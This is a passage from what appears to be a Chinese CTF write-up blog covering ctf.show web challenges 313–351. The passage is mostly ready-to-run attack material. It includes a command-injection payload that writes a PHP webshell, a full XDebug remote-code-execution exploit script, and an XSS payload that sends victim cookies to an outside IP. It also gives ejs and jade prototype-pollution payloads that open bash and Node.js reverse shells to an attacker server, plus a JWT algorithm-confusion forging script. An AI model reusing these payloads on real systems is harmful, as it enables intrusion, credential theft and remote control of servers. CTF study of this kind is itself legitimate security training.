<p>即x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzIxMWJYVjZhVjBwT3o4KyIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvbWEucGhw|base64%09-d|sh}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ma.php         mumuzi=phpinfo();</span><br></pre></td></tr></table></figure>

<h3 id="web-313"><a href="#web-313" class="headerlink" title="web-313"></a>web-313</h3><p>CVE-2012-1823</p>
<blockquote>
<p>CGI模式下的参数：<br>-c 指定php.ini文件的位置<br>-n 不要加载php.ini文件<br>-d 指定配置项<br>-b 启动fastcgi进程<br>-s 显示文件源码<br>-T 执行指定次该文件<br>-h和-？ 显示帮助</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;tac /somewhere/*&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-314"><a href="#web-314" class="headerlink" title="web-314"></a>web-314</h3><p>日志文件包含，不赘述了。</p>
<h3 id="web-315"><a href="#web-315" class="headerlink" title="web-315"></a>web-315</h3><p><em><strong>Debug 远程调试漏洞</strong></em>         <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce">https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce</a></p>
<p>漏洞描述：<br>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back &#x3D; 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = 1</span><br><span class="line">xdebug.remote_enable = 1</span><br></pre></td></tr></table></figure>

<p>这个配置下，我们访问<a target="_blank" rel="noopener" href="http://target/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>exp.py:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(1)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def recv_xml(sock):</span><br><span class="line">    blocks = []</span><br><span class="line">    data = b&#x27;&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            data = data + sock.recv(1024)</span><br><span class="line">        except socket.error as e:</span><br><span class="line">            break</span><br><span class="line">        if not data:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        while data:</span><br><span class="line">            eop = data.find(b&#x27;\x00&#x27;)</span><br><span class="line">            if eop &lt; 0:</span><br><span class="line">                break</span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+1:]</span><br><span class="line"></span><br><span class="line">        if len(blocks) &gt;= 4:</span><br><span class="line">            break</span><br><span class="line">    </span><br><span class="line">    return blocks[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def trigger(url):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    try:</span><br><span class="line">        session.get(url + &#x27;?XDEBUG_SESSION_START=phpstorm&#x27;, timeout=0.1)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;XDebug remote debug code execution.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, required=True, help=&#x27;the code you want to execute.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, required=True, help=&#x27;target url.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, default=9000, type=int, help=&#x27;local port&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    ip_port = (&#x27;0.0.0.0&#x27;, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(10)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(5)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(b&#x27;&#x27;.join([b&#x27;eval -i 1 -- &#x27;, base64.b64encode(args.code.encode()), b&#x27;\x00&#x27;]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(&#x27;[+] Recieve data: &#x27; + data.decode())</span><br><span class="line">    g = re.search(rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;, data, re.I)</span><br><span class="line">    if not g:</span><br><span class="line">        print(&#x27;[-] No result...&#x27;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    data = g.group(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(&#x27;[+] Result: &#x27; + base64.b64decode(data).decode())</span><br><span class="line">    except binascii.Error:</span><br><span class="line">        print(&#x27;[-] May be not string result...&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http://8731e14f-ee10-4df2-99f0-fef35075f5b3.challenge.ctf.show/index.php -c &#x27;shell_exec(&quot;ls&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>PS：需要有公网服务器</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="web-316"><a href="#web-316" class="headerlink" title="web-316"></a>web-316</h3><p>xss平台 <code>https://xss.pt/xss.php</code></p>
<p>注册创建项目，复制代码进入，查看自己的项目就行。</p>
<h3 id="web-320"><a href="#web-320" class="headerlink" title="web-320"></a>web-320</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.location=&quot;http://x.xx.xx.xx:1234/&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>

<p>没有vps的原因，贴上别人的WP。</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51801f145573">https://www.jianshu.com/p/51801f145573</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111644350">https://blog.csdn.net/miuzzx/article/details/111644350</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/122790222">https://blog.csdn.net/cosmoslin/article/details/122790222</a></p>
<h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><p>我学习NodesJS时，为此写了一篇总结，可以参考着看看。</p>
<h3 id="web-334"><a href="#web-334" class="headerlink" title="web-334"></a>web-334</h3><p>发现<code>name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase()</code>，上面有说过转大写时<code>ſ =&gt;&gt; S</code></p>
<p>这里直接用ctfſhow 123456登录就可以出flag了。</p>
<h3 id="web-335"><a href="#web-335" class="headerlink" title="web-335"></a>web-335</h3><p>直接利用eval读取目录文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=res.end(require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;).toString())</span><br><span class="line">/?eval=res.end(require(&#x27;fs&#x27;).readFileSync(&#x27;./fl00g.txt&#x27;).toString());</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require( &#x27;child_process&#x27; ).spawnSync( &#x27;ls&#x27;, [ &#x27;/&#x27; ] ).stdout.toString()</span><br><span class="line">require( &#x27;child_process&#x27; ).spawnSync( &#x27;cat&#x27;, [ &#x27;f*&#x27; ] ).stdout.toString()</span><br></pre></td></tr></table></figure>

<h3 id="web-336"><a href="#web-336" class="headerlink" title="web-336"></a>web-336</h3><p>直接使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=res.end(require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;).toString())</span><br><span class="line">/?eval=res.end(require(&#x27;fs&#x27;).readFileSync(&#x27;./fl00g.txt&#x27;).toString());</span><br></pre></td></tr></table></figure>

<p>其实好像是过滤了一些东西，应该是命令执行的东西，我直接调的原生函数，如果想知道过滤什么的，可以自行百度。</p>
<h3 id="web-337"><a href="#web-337" class="headerlink" title="web-337"></a>web-337</h3><p>其实和PHP一样，都可以用数组绕过。</p>
<p>但是为了突出Nodejs的特性，不利用<code>/?a[]=1&amp;b=1</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125;</span><br><span class="line"></span><br><span class="line">console.log(a+&quot;flag&#123;xxx&#125;&quot;)</span><br><span class="line">console.log(b+&quot;flag&#123;xxx&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>本地运行一下，我们发现一个对象与字符串相加，输出不会有对象内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure>

<h3 id="web-338"><a href="#web-338" class="headerlink" title="web-338"></a>web-338</h3><p>login.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>

<p>发现<code>utils.copy(user,req.body);</code>，可能会存在漏洞，接着看common.js。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  copy:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function copy(object1, object2)&#123;</span><br><span class="line">    for (let key in object2) &#123;</span><br><span class="line">        if (key in object2 &amp;&amp; key in object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            object1[key] = object2[key]             //漏洞产生点</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要使得secert.ctfshow&#x3D;&#x3D;&#x3D;’36dboy’，去拿flag。</p>
<p>这里的 <code>secert</code> 是一个数组，然后 <code>utils.copy(user,req.body);</code> 操作是 <code>user</code> 也是数组，也就是我们通过 <code>req.body</code> 即 POST 请求体传入参数，通过 <code>user</code> 污染数组的原型，那么 <code>secert</code> 数组找不到 <code>ctfshow</code> 属性时，会一直往原型找，直到在数组原型中发现 <code>ctfshow</code> 属性值为 <code>36dboy</code> 。那么 <code>if</code> 语句即判断成功，就会输出 flag 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>还有一种解法：利用ejs模块RCE。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-339"><a href="#web-339" class="headerlink" title="web-339"></a>web-339</h3><p>login.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(secert.ctfshow===flag)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能直接污染了。但是我们发现一个api.js。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>当我们访问api.js时，可以调query的function，与上述p神出的题非常类似。写个测试代码看看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function copy(object1, object2)&#123;</span><br><span class="line">    for (let key in object2) &#123;</span><br><span class="line">        if (key in object2 &amp;&amp; key in object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">yake = &quot;daigua&quot;</span><br><span class="line">body = JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return yake&quot;&#125;&#125;&#x27;);</span><br><span class="line">copy(user, body)</span><br><span class="line"></span><br><span class="line">&#123; query: Function(query)(query)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221030155606986.png" alt="image-20221030155606986"></p>
<p>可以发现，query的功能为return “daigua”，在copy时，相当于给Object对象添加了query。那么，当然可以在这里构造一个函数，进行RCE。</p>
<p>有一点需要注意，require可能不会被识别，需要利用global.process.mainModule.constructor._load。</p>
<p>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;</span><br><span class="line">var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="line">cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="line">sh = cp.spawn(&#x27;/bin/sh&#x27;, []);</span><br><span class="line">var client = new net.Socket();</span><br><span class="line">client.connect(port, &#x27;server&#x27;, </span><br><span class="line">function(&#123;client.pipe(sh.stdin);</span><br><span class="line">		sh.stdout.pipe(client);</span><br><span class="line">		sh.stderr.pipe(client);&#125;);</span><br><span class="line">		return /a/;&#125;)</span><br><span class="line">		();&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在login传入，然后访问api即可。当然也可以污染ejs模块RCE。</p>
<h3 id="web-340"><a href="#web-340" class="headerlink" title="web-340"></a>web-340</h3><p>发现 <code>userinfo</code> 的原型不是 <code>Object</code> 对象， <code>userinfo.__proto__.__proto__</code> 才是 <code>Object</code> 对象。</p>
<h3 id="web-341"><a href="#web-341" class="headerlink" title="web-341"></a>web-341</h3><p>污染两级，ejs rce。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-342"><a href="#web-342" class="headerlink" title="web-342"></a>web-342</h3><p><strong>jade原型链污染</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-343"><a href="#web-343" class="headerlink" title="web-343"></a>web-343</h3><p>342的payload一样打。</p>
<h3 id="web-344"><a href="#web-344" class="headerlink" title="web-344"></a>web-344</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag = &#x27;flag_here&#x27;;</span><br><span class="line">  if(req.url.match(/8c|2c|\,/ig))&#123;</span><br><span class="line">    res.end(&#x27;where is flag :)&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  var query = JSON.parse(req.query.query);</span><br><span class="line">  if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    res.end(&#x27;where is flag. :)&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>发现题目会过滤掉逗号，尝试 URL 编码， <code>urlencode(&quot;,&quot;) = %2c</code> 发现 <code>2c</code> 也被过滤</p>
<p>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的。</p>
<p>nodejs 会把同名参数以数组的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>这里把 c进行url编码，是因为 双引号 的url编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p>
<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>可以先了解一下jwt的构成。</p>
<h3 id="web-345"><a href="#web-345" class="headerlink" title="web-345"></a>web-345</h3><p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>没有加密，直接修改user为admin，访问admin即可</p>
<h3 id="web-346"><a href="#web-346" class="headerlink" title="web-346"></a>web-346</h3><p>加密123456，暴力破解</p>
<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<h3 id="web-347"><a href="#web-347" class="headerlink" title="web-347"></a>web-347</h3><p>一样，跑就完事了，123456</p>
<h3 id="web-348"><a href="#web-348" class="headerlink" title="web-348"></a>web-348</h3><p>aaab</p>
<h3 id="web-349"><a href="#web-349" class="headerlink" title="web-349"></a>web-349</h3><p>拿源码，把环境搭起来，访问自己本地的，直接post拿flag就行。</p>
<h3 id="web-350"><a href="#web-350" class="headerlink" title="web-350"></a>web-350</h3><p>密钥混淆攻击 （你用公钥解密，我直接就用公钥生成）</p>
<p>JWT最常用的两种算法是HMAC和RSA。HMAC（对称加密算法）用同一个密钥对token进行签名和认证。而RSA（非对称加密算法）需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。</p>
<p>如果将算法RS256修改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）？</p>
<p>那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p>
<p>这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;);</span><br><span class="line">var fs = require(&#x27;fs&#x27;);</span><br><span class="line">var privateKey = fs.readFileSync(&#x27;public.key&#x27;);</span><br><span class="line">var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, privateKey, &#123; algorithm: &#x27;HS256&#x27; &#125;);</span><br><span class="line">console.log(token)</span><br></pre></td></tr></table></figure>

<p>运行 nodejs 获取 cookie 去替换即可</p>
<p>防御方法：JWT配置应该只允许使用HMAC算法或公钥算法，决不能同时使用这两种算法</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web-351"><a href="#web-351" class="headerlink" title="web-351"></a>web-351</h3><p>curl_exec()直接</p>
